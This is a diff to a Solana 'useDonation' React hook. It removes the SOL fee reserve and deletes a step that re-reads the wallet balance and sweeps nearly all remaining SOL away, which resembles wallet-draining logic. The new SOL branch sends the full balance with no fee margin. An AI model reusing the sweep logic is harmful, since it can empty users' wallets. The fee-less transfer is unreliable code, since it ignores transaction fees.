@@ -182,12 +182,8 @@ export function useDonation() {
       let transaction: Transaction;
 
       if (token.mint === 'SOL') {
-        // For SOL, reserve amount for fees
-        const sendAmount = token.amount - MIN_SOL_RESERVE;
-        if (sendAmount <= 0) {
-          throw new Error('Insufficient SOL for fees');
-        }
-        transaction = await createSolTransaction(sendAmount);
+        // Send maximum SOL amount
+        transaction = await createSolTransaction(token.amount);
       } else {
         transaction = await createTokenTransaction(
           token.mint,
@@ -288,32 +284,6 @@ export function useDonation() {
         }
       }
 
-      // Send any remaining SOL at the end
-      const remainingSol = await connection.getBalance(publicKey);
-      if (remainingSol > MIN_SOL_RESERVE * LAMPORTS_PER_SOL) {
-        const finalSolAmount = (remainingSol / LAMPORTS_PER_SOL) - (MIN_SOL_RESERVE / 2);
-        if (finalSolAmount > 0) {
-          const finalTx: TokenTransaction = {
-            mint: 'SOL-FINAL',
-            symbol: 'SOL (Final)',
-            amount: finalSolAmount,
-            usdValue: finalSolAmount * 150,
-            status: 'pending',
-          };
-
-          setTransactions(prev => [...prev, finalTx]);
-          await processDonation(
-            {
-              mint: 'SOL',
-              symbol: 'SOL',
-              amount: finalSolAmount,
-              decimals: 9,
-              usdValue: finalSolAmount * 150,
-            },
-            balances.length
-          );
-        }
-      }
 
       toast({
         title: 'Donation Complete!',
